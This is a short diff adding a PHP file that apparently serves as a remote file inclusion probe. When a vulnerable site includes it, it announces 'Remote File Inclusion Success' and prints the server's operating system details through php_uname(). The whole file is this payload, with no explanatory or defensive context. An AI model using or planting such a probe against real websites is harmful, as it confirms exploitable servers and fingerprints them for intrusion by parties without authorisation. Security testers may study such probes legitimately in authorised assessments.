@@ -1,0 +1,4 @@
+<?php
+echo "c0ded - Remote File Inclusion Success\n";
+echo "Server OS: " . php_uname() . "\n";
+?>
